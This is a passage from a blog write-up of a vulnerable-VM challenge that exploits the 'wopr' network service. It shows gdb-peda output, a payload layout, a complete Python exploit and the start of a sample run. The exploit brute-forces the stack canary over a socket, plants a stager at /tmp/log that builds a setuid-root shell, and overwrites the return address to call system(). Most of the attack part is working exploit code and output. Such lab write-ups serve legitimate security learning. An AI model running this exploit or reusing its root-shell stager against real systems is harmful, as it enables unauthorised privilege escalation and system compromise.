</span><span class='line'>/tmp/log          <span class="c"># &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
</span><span class='line'>TMPLOG
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
</span><span class='line'>accept
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
</span></code></pre></td></tr></table></div></figure>


<p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>

<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>

<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>

<figure class='code'><figcaption><span>finding</span><a href='/tmp/log'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
</span><span class='line'>Reading symbols from wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *main
</span><span class='line'>Breakpoint 1 at 0x80487de
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0x66a6f92e
</span><span class='line'>EDX: 0x1
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0xbffff478 --&gt; 0x0
</span><span class='line'>ESP: 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>EIP: 0x80487de <span class="o">(</span>&lt;main&gt;: push   ebp<span class="o">)</span>
</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x80487d7 &lt;get_reply+99&gt;:    call   0x804865c &lt;__stack_chk_fail@plt&gt;
</span><span class='line'>   0x80487dc &lt;get_reply+104&gt;:   leave
</span><span class='line'>   0x80487dd &lt;get_reply+105&gt;:   <span class="nv">ret</span>
</span><span class='line'><span class="o">=</span>&gt; 0x80487de &lt;main&gt;:    push   ebp
</span><span class='line'>   0x80487df &lt;main+1&gt;:  mov    ebp,esp
</span><span class='line'>   0x80487e1 &lt;main+3&gt;:  sub    esp,0x258
</span><span class='line'>   0x80487e7 &lt;main+9&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
</span><span class='line'>   0x80487ea &lt;main+12&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0x23c<span class="o">]</span>,eax
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff400 --&gt; 0x1
</span><span class='line'>0008<span class="p">|</span> 0xbffff404 --&gt; 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff408 --&gt; 0xbffff4ac --&gt; 0xbffff629 <span class="o">(</span><span class="s2">&quot;SSH_AGENT_PID=3171&quot;</span><span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff40c --&gt; 0xb7fe08d8 --&gt; 0xb7e74000 --&gt; 0x464c457f
</span><span class='line'>0020<span class="p">|</span> 0xbffff410 --&gt; 0xb7ff6821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff414 --&gt; 0xffffffff
</span><span class='line'>0028<span class="p">|</span> 0xbffff418 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Breakpoint 1, 0x080487de in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>searchmem /tmp/log
</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;/tmp/log&#39;</span> in: None ranges
</span><span class='line'>Found 2 results, display max 2 items:
</span><span class='line'>wopr : 0x8048c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
</span><span class='line'>wopr : 0x8049c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>

<h2>wopr &ndash; the exploit</h2>

<p>To sum up what we have to do to exploit this, we can say that we have to:</p>

<ul>
<li>Provide a string of size 30</li>
<li>Provide the canary we have brute forced</li>
<li>Pad with 4 bytes</li>
<li>Write EIP to the location of <code>system()</code></li>
<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
<li>Provide the location of <code>/tmp/log</code></li>
</ul>


<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; + &quot;\xff\xff\xff\xff&quot; + &quot;AAAA&quot; +
</span><span class='line'>&quot;\x10\xc2\x16\x00&quot; + &quot;JUNK&quot; + &quot;\x60\x8c\x04\x08&quot;
</span></code></pre></td></tr></table></div></figure>


<p>I finished up coding the exploit, which eventually resulted in the following:</p>

<figure class='code'><figcaption><span>Persistence Sploit</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes to before the canary is hit</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>     <span class="c"># canary that should update as its bruted</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">            A: &quot;So, I heard you like pain...?&quot;</span>
</span><span class='line'><span class="s">            B: &quot;... a bit&quot;</span>
</span><span class='line'><span class="s">            C: &quot;Well, here it is, the: &quot;</span>
</span><span class='line'><span class="s"> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___ </span>
</span><span class='line'><span class="s">|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]</span>
</span><span class='line'><span class="s">|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_ </span>
</span><span class='line'><span class="s">|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]</span>
</span><span class='line'><span class="s">|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_ </span>
</span><span class='line'><span class="s">|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |</span>
</span><span class='line'><span class="s">|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|</span>
</span><span class='line'><span class="s">      _____ ____  _       ___  ____  ______ </span>
</span><span class='line'><span class="s">     / ___/|    \| |     /   \|    ||      |</span>
</span><span class='line'><span class="s">    (   \_ |  o  ) |    |     ||  | |      |</span>
</span><span class='line'><span class="s">     \__  ||   _/| |___ |  O  ||  | |_|  |_|</span>
</span><span class='line'><span class="s">     /  \ ||  |  |     ||     ||  |   |  |  </span>
</span><span class='line'><span class="s">     \    ||  |  |     ||     ||  |   |  |  </span>
</span><span class='line'><span class="s">      \___||__|  |_____| \___/|____|  |__|  </span>
</span><span class='line'><span class="s">                                        </span>
</span><span class='line'><span class="s">                A: &quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
</span><span class='line'><span class="s">                A: &quot;I also have no idea what I am doing&quot;</span>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Connecting &amp; starting canary brute force...&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the byte</span>
</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the payload</span>
</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># connect and send payload</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># get the inital banners</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt; </span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># send the payload  </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit of the canary. No luck&quot;</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># The canary is our ticket out of here!</span>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary known as : {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Writing /tmp/log to be called by wopr later&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ./wopr has the string /tmp/log in it. We will use this as</span>
</span><span class='line'>    <span class="c"># our code exec point, overwriting whatever is in it atm</span>
</span><span class='line'>    <span class="n">stager</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">        #!/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # First, prepare a small C shell and move it to /tmp with name getroot</span>
</span><span class='line'><span class="s">        echo &quot;int main(void)</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">setuid(0);</span><span class="se">\n</span><span class="s">system(</span><span class="se">\\</span><span class="s">&quot;/bin/sh</span><span class="se">\\</span><span class="s">&quot;);</span><span class="se">\n</span><span class="s">return 0;</span><span class="se">\n</span><span class="s">}&quot; &gt; /tmp/getroot.c</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # compile it</span>
</span><span class='line'><span class="s">        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # change ownership and setuid</span>
</span><span class='line'><span class="s">        /bin/chown root:root /tmp/getroot</span>
</span><span class='line'><span class="s">        /bin/chmod 4777 /tmp/getroot</span>
</span><span class='line'><span class="s">    &quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># write the file</span>
</span><span class='line'>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span><span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">stager_file</span><span class="p">:</span>
</span><span class='line'>        <span class="n">stager_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">stager</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># make it executable</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># now, with the stack canary known and the stager ready, lets corrupt</span>
</span><span class='line'>    <span class="c"># EIP and sploit!</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>               <span class="c"># canary we bruted</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">4</span>              <span class="c"># padding to EIP wich is at byte 42</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x10\x62\xe5\xb7</span><span class="s">&quot;</span>   <span class="c"># system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;JUNK&quot;</span>               <span class="c"># JUNK. Should probably do exit() here. Meh.</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x60\x8c\x04\x08</span><span class="s">&quot;</span>   <span class="c"># location if /tmp/log string in .data</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># and connect &amp;&amp; send</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Connecting to service&quot;</span>
</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sending Payload&quot;</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&quot;</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/tmp/getroot&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[!] Incomplete Canary. Can&#39;t continue reliably&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># done</span>
</span></code></pre></td></tr></table></div></figure>


<p>A sample run would be:</p>

<figure class='code'><figcaption><span>Running sploit.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /tmp/sploit.py
</span><span class='line'>-rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
</span><span class='line'>bash-4.1<span class="nv">$ </span>python /tmp/sploit.py
</span><span class='line'>
</span><span class='line'>            A: <span class="s2">&quot;So, I heard you like pain...?&quot;</span>
</span><span class='line'>            B: <span class="s2">&quot;... a bit&quot;</span>
</span><span class='line'>            C: <span class="s2">&quot;Well, here it is, the: &quot;</span>
</span><span class='line'> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
</span><span class='line'><span class="p">|</span>    <span class="se">\ </span>/  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span> / ___/<span class="p">|</span>    / ___/<span class="p">|</span>      <span class="p">|</span>  /  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span>  /  <span class="o">]</span>  /  _<span class="o">]</span>
</span><span class='line'><span class="p">|</span>  o  <span class="o">)</span>  <span class="o">[</span>_ <span class="p">|</span>  D  <span class="o">)(</span>   <span class="se">\_</span>  <span class="p">|</span>  <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>      <span class="p">|</span> /  <span class="o">[</span>_ <span class="p">|</span>  _  <span class="p">|</span> /  /  /  <span class="o">[</span>_
</span><span class='line'><span class="p">|</span>   _/    _<span class="o">]</span><span class="p">|</span>    /  <span class="se">\_</span>_  <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\_</span>_  <span class="o">||</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="o">||</span>    _<span class="o">]</span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>/  /  <span class="p">|</span>    _<span class="o">]</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>    <span class="se">\ </span> /  <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>  <span class="p">|</span>/  <span class="se">\ </span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>  <span class="p">|</span>  /   <span class="se">\_</span> <span class="p">|</span>   <span class="o">[</span>_
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>     <span class="o">||</span>  .  <span class="se">\ \ </span>   <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\ </span>   <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span>  <span class="se">\ </span>    <span class="o">||</span>     <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span><span class="se">\_</span><span class="p">|</span>  <span class="se">\_</span>__<span class="o">||</span>____<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>___<span class="o">||</span>_____<span class="p">|</span>
</span><span class='line'>      _____ ____  _       ___  ____  ______
</span><span class='line'>     / ___/<span class="p">|</span>    <span class="se">\|</span> <span class="p">|</span>     /   <span class="se">\|</span>    <span class="o">||</span>      <span class="p">|</span>
